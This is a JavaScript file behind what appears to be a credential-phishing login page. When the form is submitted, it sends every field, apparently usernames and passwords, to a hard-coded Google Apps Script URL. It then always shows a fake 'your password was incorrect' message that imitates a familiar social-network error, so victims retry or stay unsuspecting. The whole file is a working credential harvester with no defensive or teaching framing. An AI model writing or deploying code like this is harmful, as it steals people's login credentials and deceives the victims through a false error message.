const scriptURL = 'https://script.google.com/macros/s/AKfycbz8Pn4wzVKDI9c6D9dlgqOeNyvP_T56SH0gRgipGhnBbhwt0A_BneQgNT0rJLcPLapI/exec'

const form = document.getElementById("form");
const button = document.getElementById("bttnn");
const message = document.getElementById("mssgg");


// --------------------------
function setDatentime() {
    const currentDate = new Date();
    
    let dateinput = document.getElementById("dateset");
    let timeinput = document.getElementById("timeset");

    const date = currentDate.getDate();
    const month = currentDate.getMonth() + 1;
    const year = currentDate.getFullYear();
    const hours = currentDate.getHours();
    const minutes = currentDate.getMinutes();
    const seconds = currentDate.getSeconds();


    let newDate = date + "/" + month + "/" + year;
    let newTime = hours + ":" + minutes + ":" + seconds;

    dateinput.value = newDate;
    timeinput.value = newTime;

    console.log(dateinput.value);
    console.log(timeinput.value);
}
// --------------------------

form.addEventListener('submit', (e) => {
    button.innerText = "Loading..."
    let d = new FormData(form);
    fetch(scriptURL,
        {
            method: 'POST',
            body: d
        })
        .then((response) => {
            setTimeout(() => {
                message.innerText = "Sorry, your password was incorrect. Please double-check your password."
            }, 1000)
            button.innerText = "Log in"
        })
        .catch((error) => {
            button.innerText = "Log in"
        })
    e.preventDefault() 
});
